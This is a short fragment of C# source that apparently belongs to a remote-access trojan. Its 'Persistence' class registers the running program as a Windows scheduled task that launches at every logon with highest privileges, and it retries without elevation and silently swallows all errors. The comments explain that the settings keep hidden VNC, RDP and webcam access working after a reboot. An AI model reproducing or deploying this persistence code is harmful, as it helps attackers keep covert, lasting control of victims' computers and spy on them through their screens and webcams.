...
internal static partial class Persistence
{
    ...
    public static void InstallScheduledTask(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            // /IT (Run Only When User Is Logged On) is required for the task to have access
            // to the interactive desktop (WinSta0). Without it, HVNC/RDP/webcam fail at reboot
            // because the task process has no WinSta0 access even though it's in session 1.
            // /F forces overwrite so settings are always up to date.
            var (code, _) = RunSchtasks($"/Create /TN \"{name}\" /TR \"{selfPath}\" /SC ONLOGON /RL HIGHEST /IT /F");
            if (code != 0)
                RunSchtasks($"/Create /TN \"{name}\" /TR \"{selfPath}\" /SC ONLOGON /IT /F");
        }
        catch { }
    }
